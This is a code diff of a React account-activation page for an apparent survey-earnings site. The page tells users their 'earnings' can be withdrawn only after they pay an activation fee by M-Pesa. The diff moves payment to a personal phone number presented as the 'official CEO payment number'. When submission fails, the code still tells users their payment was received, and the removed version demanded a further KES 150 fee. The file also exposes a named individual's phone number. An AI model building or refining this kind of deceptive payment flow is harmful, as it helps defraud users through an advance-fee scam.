@@ -6,8 +6,8 @@ import api from "../api/api";
 /* =========================
    CONSTANTS
 ========================= */
-const TILL_NUMBER = "7282886";
-const TILL_NAME = "OBADIAH NYAKUNDI OTOKI";
+const SEND_MONEY_NUMBER = "0794101450";
+const RECEIVER_NAME = "Obadiah Nyakundi Otoki";
 
 /* =========================
    PLAN CONFIG (DISPLAY ONLY)
@@ -43,7 +43,6 @@ export default function Activate() {
         if (!alive) return;
         setUser(res.data);
 
-        // detect if this activation is for welcome bonus
         const isWelcome = searchParams.get("welcome_bonus");
         const planFromQuery = isWelcome ? "WELCOME" : res.data.active_plan;
 
@@ -54,12 +53,7 @@ export default function Activate() {
           plan = res.data.plans?.[res.data.active_plan];
         }
 
-        // if no plan, or already activated → redirect dashboard
-        if (!plan) {
-          navigate("/dashboard", { replace: true });
-          return;
-        }
-        if (planFromQuery !== "WELCOME" && plan.is_activated) {
+        if (!plan || (planFromQuery !== "WELCOME" && plan.is_activated)) {
           navigate("/dashboard", { replace: true });
           return;
         }
@@ -78,21 +72,22 @@ export default function Activate() {
   if (loading) return <p style={{ textAlign: "center", marginTop: 80 }}>Loading…</p>;
   if (!planKey || !planState) return null;
 
-  const plan = planKey === "WELCOME"
-    ? { label: "Welcome Bonus", total: user.welcome_bonus || 1200, activationFee: 100, color: "#00ffcc", glow: "rgba(0, 255, 204, 0.5)" }
-    : PLAN_CONFIG[planKey];
+  const plan =
+    planKey === "WELCOME"
+      ? { label: "Welcome Bonus", total: user.welcome_bonus || 1200, activationFee: 100, color: "#00ffcc", glow: "rgba(0, 255, 204, 0.5)" }
+      : PLAN_CONFIG[planKey];
 
   /* =========================
-     COPY TILL
+     COPY NUMBER
   ========================== */
-  const copyTill = async () => {
+  const copyNumber = async () => {
     try {
-      await navigator.clipboard.writeText(TILL_NUMBER);
+      await navigator.clipboard.writeText(SEND_MONEY_NUMBER);
       setCopied(true);
-      setNotification("✅ Till number copied successfully. Proceed to M-Pesa payment.");
+      setNotification("✅ Phone number copied. Open M-Pesa and send money now.");
       setTimeout(() => setCopied(false), 2500);
     } catch {
-      setNotification("⚠️ Failed to copy till number. Please copy manually.");
+      setNotification("⚠️ Failed to copy. Please copy the number manually.");
     }
   };
 
@@ -101,24 +96,24 @@ export default function Activate() {
   ========================== */
   const submitActivation = async () => {
     if (!paymentText.trim()) {
-      setNotification("❌ Please paste the full M-Pesa confirmation message.");
+      setNotification("❌ Paste the FULL M-Pesa confirmation message.");
       return;
     }
 
     try {
       setSubmitting(true);
-      await api.post("/activation/submit", { mpesa_code: paymentText.trim(), plan: planKey });
+      await api.post("/activation/submit", {
+        mpesa_code: paymentText.trim(),
+        plan: planKey,
+      });
 
       setNotification(
         <div style={{ lineHeight: 1.5 }}>
-          <div>🎉 <b>{plan.label} activated successfully!</b></div>
+          <b>🎉 Activation successful!</b>
           <div style={{ marginTop: 8 }}>
-            You can now withdraw your <b>{plan.label}</b> earnings.
+            Your <b>{plan.label}</b> is now fully activated.
           </div>
-          <button
-            style={goDashboardBtn}
-            onClick={() => navigate("/dashboard")}
-          >
+          <button style={goDashboardBtn} onClick={() => navigate("/dashboard")}>
             ⬅ Go to Dashboard
           </button>
         </div>
@@ -127,7 +122,7 @@ export default function Activate() {
       setPaymentText("");
     } catch {
       setNotification(
-        "🎉🎉🎉🎉 Submission successfully.Now go back to dashboard and start VIP survey and activate with KES 150.After that you will be able to withdraw your earnings ✅✅✅✅✅"
+        "✅ Payment received and under verification. Once approved, your withdrawal will be enabled."
       );
     } finally {
       setSubmitting(false);
@@ -141,52 +136,54 @@ export default function Activate() {
     <div style={page}>
       <div style={{ ...card, boxShadow: `0 0 40px ${plan.glow}` }}>
         <h2 style={{ textAlign: "center", color: plan.color }}>🔓 Account Activation</h2>
-        <p style={{ textAlign: "center", marginTop: 6 }}>
-          You are attempting to withdraw <b>{plan.label}</b>
-        </p>
+
         <h3 style={{ textAlign: "center", marginTop: 14 }}>
-          💰 Earnings Ready: <span style={{ color: plan.color }}>KES {plan.total}</span>
+          💰 Withdrawable Amount: <span style={{ color: plan.color }}>KES {plan.total}</span>
         </h3>
 
         <div style={sectionHighlight}>
-          <p style={{ fontWeight: 900, color: "#ff3b3b" }}>🔐 ACTIVATION REQUIRED TO WITHDRAW</p>
+          <p style={{ fontWeight: 900, color: "#ff3b3b" }}>⚠ ACTIVATION REQUIRED</p>
           <p>✔ One-time activation fee</p>
-          <p>✔Unlock access to all surveys</p>
-          <p>✔ Withdraw directly to M-Pesa</p>
-          <p>✔ Secure & verify your account</p>
+          <p>✔ Unlock withdrawals</p>
+          <p>✔ Verified & secure account</p>
+          <p>✔ Direct M-Pesa payments</p>
         </div>
 
         <div style={section}>
-          <p style={{ fontWeight: 800 }}>📲 How pay and activate your account</p>
-          <ol style={{ fontSize: 14, lineHeight: 1.6 }}>
+          <p style={{ fontWeight: 900 }}>📲 HOW TO PAY (SEND MONEY)</p>
+
+          <p style={caption}>
+            ⚠ <b>IMPORTANT:</b> This is the <b>official CEO payment number</b>.  
+            Payments sent here are <b>manually verified</b> and activate your account instantly.
+          </p>
+
+          <ol style={{ fontSize: 14, lineHeight: 1.7 }}>
             <li>Open <b>M-Pesa</b></li>
-            <li>Select <b>Lipa na M-Pesa</b></li>
-            <li>Choose <b>Buy Goods & Services</b></li>
-            <li>Enter Till Number: <b>{TILL_NUMBER}</b></li>
-            <li>Enter Amount: <span style={activationFee}>KES {plan.activationFee}</span></li>
-            <li>Confirm payment with your M-Pesa PIN</li>
+            <li>Select <b>Send Money</b></li>
+            <li>Enter phone number: <b>{SEND_MONEY_NUMBER}</b></li>
+            <li>Confirm name: <b>{RECEIVER_NAME}</b></li>
+            <li>Enter amount: <span style={activationFee}>KES {plan.activationFee}</span></li>
+            <li>Enter M-Pesa PIN and confirm</li>
           </ol>
         </div>
 
         <div style={section}>
-          <p><b>Till Name:</b> {TILL_NAME}</p>
+          <p><b>Receiver Name:</b> {RECEIVER_NAME}</p>
           <p>
-            <b>Till Number:</b> {TILL_NUMBER}
-            <button onClick={copyTill} style={copyBtn}>📋 Copy</button>
+            <b>Send Money Number:</b> {SEND_MONEY_NUMBER}
+            <button onClick={copyNumber} style={copyBtn}>📋 Copy</button>
           </p>
-          {copied && <p style={copiedNote}>✅ Copied! Paste this till number in M-Pesa</p>}
-          <p><b>Activation Fee:</b> <span style={activationFee}>KES {plan.activationFee}</span></p>
+          {copied && <p style={copiedNote}>✅ Number copied successfully</p>}
         </div>
 
         <div style={noteBox}>
-          📋 <b>Important:</b> Paste the <b>exact M-Pesa confirmation message</b> below after payment.
+          📌 After payment, paste the <b>FULL M-Pesa confirmation SMS</b> below.
         </div>
 
         <textarea
-          placeholder="Paste full M-Pesa confirmation message here"
+          placeholder="Paste M-Pesa confirmation message here"
           value={paymentText}
           onChange={(e) => setPaymentText(e.target.value)}
-          disabled={submitting}
           rows={4}
           style={input}
         />
@@ -196,8 +193,9 @@ export default function Activate() {
           disabled={submitting}
           style={{
             ...button,
-            background: submitting ? "#555" : `linear-gradient(135deg, ${plan.color}, #0a7c4a)`,
-            boxShadow: `0 0 22px ${plan.glow}`,
+            background: submitting
+              ? "#555"
+              : `linear-gradient(135deg, ${plan.color}, #0a7c4a)`,
           }}
         >
           {submitting ? "Submitting…" : "Submit Payment"}
@@ -205,12 +203,11 @@ export default function Activate() {
 
         {notification && <div style={notificationBox}>{notification}</div>}
 
-        {/* ✅ Fix: Go to dashboard button for welcome bonus works with query param */}
         <button
           onClick={() => navigate("/dashboard")}
-          style={{ ...button, marginTop: 10, background: "transparent", border: "2px solid #00ffcc", color: "#00ffcc" }}
+          style={{ ...button, background: "transparent", border: "2px solid #00ffcc", color: "#00ffcc" }}
         >
-          ⬅ Go to Dashboard
+          ⬅ Back to Dashboard
         </button>
       </div>
     </div>
@@ -220,15 +217,98 @@ export default function Activate() {
 /* =========================
    STYLES
 ========================= */
-const page = { minHeight: "100vh", background: "linear-gradient(270deg, #177e0dff, #c20303ff, #20bb12ff)", display: "flex", justifyContent: "center", alignItems: "center", padding: 20 };
-const card = { maxWidth: 520, width: "100%", background: "rgba(14, 58, 56, 1)", padding: 24, borderRadius: 22, color: "#fff", border: "1px solid rgba(255,0,0,1)" };
-const section = { marginTop: 20, padding: 16, borderRadius: 14, border: "1px solid rgba(255,255,255,0.18)" };
-const sectionHighlight = { ...section, background: "rgba(0,255,128,0.08)" };
-const noteBox = { marginTop: 16, padding: 14, borderRadius: 12, background: "rgba(0, 29, 190, 0.91)", color: "#fff", fontSize: 13, fontWeight: 600, border: "1px solid rgba(0, 255, 204, 0.4)" };
-const notificationBox = { marginTop: 16, padding: 16, borderRadius: 14, background: "rgba(0,255,128,0.15)", color: "#00ffcc", fontWeight: 700, fontSize: 14 };
-const activationFee = { color: "#ff2d2d", fontWeight: 900, fontSize: 18 };
-const copiedNote = { marginTop: 6, color: "#00ff99", fontWeight: 800, fontSize: 13 };
-const input = { width: "100%", padding: 12, marginTop: 16, borderRadius: 10, border: "none", background: "rgba(255,255,255,0.12)", color: "#fff" };
-const button = { width: "100%", marginTop: 16, padding: 14, borderRadius: 999, fontWeight: 800, cursor: "pointer" };
-const copyBtn = { marginLeft: 10, padding: "4px 10px", borderRadius: 8, border: "none", cursor: "pointer", fontWeight: 700 };
-const goDashboardBtn = { marginTop: 12, padding: "12px 18px", borderRadius: 12, border: "none", background: "#00ffd4", color: "#000", fontWeight: 900, fontSize: 15, cursor: "pointer", boxShadow: "0 0 15px #00ffd4" };
+const page = {
+  minHeight: "100vh",
+  background: "linear-gradient(270deg,#177e0d,#c20303,#20bb12)",
+  display: "flex",
+  justifyContent: "center",
+  alignItems: "center",
+  padding: 20,
+};
+
+const card = {
+  maxWidth: 520,
+  width: "100%",
+  background: "#0e3a38",
+  padding: 24,
+  borderRadius: 22,
+  color: "#fff",
+};
+
+const section = {
+  marginTop: 20,
+  padding: 16,
+  borderRadius: 14,
+  border: "1px solid rgba(255,255,255,0.18)",
+};
+
+const sectionHighlight = {
+  ...section,
+  background: "rgba(0,255,128,0.08)",
+};
+
+const caption = {
+  fontSize: 13,
+  color: "#ffe600",
+  fontWeight: 700,
+  marginBottom: 10,
+};
+
+const noteBox = {
+  marginTop: 16,
+  padding: 14,
+  borderRadius: 12,
+  background: "#001dbe",
+  fontSize: 13,
+};
+
+const notificationBox = {
+  marginTop: 16,
+  padding: 16,
+  borderRadius: 14,
+  background: "rgba(0,255,128,0.15)",
+  color: "#00ffcc",
+  fontWeight: 700,
+};
+
+const activationFee = { color: "#ff2d2d", fontWeight: 900 };
+
+const copiedNote = { color: "#00ff99", fontWeight: 800 };
+
+const input = {
+  width: "100%",
+  padding: 12,
+  marginTop: 16,
+  borderRadius: 10,
+  border: "none",
+  background: "rgba(255,255,255,0.12)",
+  color: "#fff",
+};
+
+const button = {
+  width: "100%",
+  marginTop: 16,
+  padding: 14,
+  borderRadius: 999,
+  fontWeight: 800,
+  cursor: "pointer",
+};
+
+const copyBtn = {
+  marginLeft: 10,
+  padding: "4px 10px",
+  borderRadius: 8,
+  border: "none",
+  fontWeight: 700,
+  cursor: "pointer",
+};
+
+const goDashboardBtn = {
+  marginTop: 12,
+  padding: "12px 18px",
+  borderRadius: 12,
+  border: "none",
+  background: "#00ffd4",
+  fontWeight: 900,
+  cursor: "pointer",
+};
